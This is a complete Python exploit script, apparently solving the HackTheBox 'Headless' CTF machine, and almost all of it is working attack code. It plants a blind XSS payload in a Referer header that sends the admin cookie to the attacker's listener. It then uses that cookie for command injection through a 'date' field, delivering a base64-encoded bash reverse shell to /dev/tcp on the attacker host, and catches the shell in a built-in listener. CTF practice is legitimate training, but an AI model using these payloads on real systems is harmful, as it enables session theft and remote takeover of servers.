#!/usr/bin/env python3

import requests
import argparse
import base64
import socket
import time
import sys

TARGET = 'http://10.10.11.8:5000'


def receive_cookie(lhost: str, http_port: int) -> str:
    """Function responsible for opening a socket listener on port 80 and
    intercepting the HTTP request sent from the target machine.

    Arguments
        lhost: str - The attacker's tun0 IP address
        http_port: int - The attacker's port to receive the http conncetion from the blind XSS

    Return: str
        The admin cookie, used for authentication.
    """
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        soc.bind((lhost, http_port))
    except Exception as message:
        print(f'[-] Bind failed: {message}')
        return ''

    soc.listen(1)
    conn, address = soc.accept()

    print(f'[+] Connection from {str(address)}')

    # The data received is headers the HTTP headers!
    headers = conn.recv(1024).decode()

    # We do some magic to extract just the cookie from the headers
    cookie = headers[:headers.index('HTTP/1.1')].rstrip().split('is_admin=')[1]

    conn.close()

    print(f'[+] Admin cookie: {cookie}')
    return cookie


def exploit_xss(lhost: str, http_port: int) -> bool:
    vulnerable_endpoint = 'support'
    xss_payload = f'<script>new Image().src="http://{lhost}:{http_port}/?c="+document.cookie;</script>'

    # Any header would do, Referer was randomly picked
    headers = {
        'Referer': xss_payload
    }

    data = {
        'fname': '1234',
        'lname': '1234',
        'email': '1234@1234.com',
        'phone': '1234567890',
        'message': '<>' # Trigger the protection mechanism
    }

    r = requests.post(f'{TARGET}/{vulnerable_endpoint}', headers=headers, data=data)

    if 'Hacking Attempt Detected' in r.text:
        print('[+] Exploited blind XSS successfully, waiting for connection (may take up to 2 minutes)...')
        return True
    else:
        print('[-] Something went wrong when exploiting the xss.')
        return False


def command_injection(lhost: str, lport: int, admin_cookie: str):
    vulnerable_endpoint = 'dashboard'
    payload = f'sleep 3 && bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'

    base64_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

    data = {
        'date': f'2023-09-15;echo {base64_payload} | base64 -d | /bin/bash'
    }

    cookies = {
        'is_admin': admin_cookie
    }

    print('[~] Sending command injection payload...')
    
    try:
        # Timeout trick so we don't wait for response, and there's time to receive the reverse shell connection
        r = requests.post(f'{TARGET}/{vulnerable_endpoint}', data=data, cookies=cookies, timeout=1.5) 
    except Exception as e:
        pass

    print('[+] Command injection payload has been sent.')
    return


def receive_shell(lhost: str, lport: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((lhost, lport))
    s.listen(1)
    
    print(f"[~] Listening on port {lport}, waiting for connection...")
    
    conn, addr = s.accept()
    print(f'[+] Connection received from {addr} - Enjoy your shell by @behindsecurity!\n\n')
    while True:
        # Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        # Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        # Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])


def main():
    parser = argparse.ArgumentParser(description='Get a non-interactive shell on Headless CTF from HackTheBox.')
    parser.add_argument('--lhost', type=str, help='Your tun0 IP address to get the shell connection.', required=True)
    parser.add_argument('--lport', type=int, default=1337, help='A port to get the reverse shell connection. Defaults to 1337.')
    parser.add_argument('--http-port', type=int, default=80, help='A port to receive the blind XSS connection. Defaults to 80.')
    
    args = parser.parse_args()

    if not exploit_xss(args.lhost, args.http_port):
        sys.exit()

    admin_cookie = receive_cookie(args.lhost, args.http_port)
    if not admin_cookie:
        sys.exit()

    command_injection(args.lhost, args.lport, admin_cookie)

    receive_shell(args.lhost, args.lport)


if __name__ == '__main__':
    main()
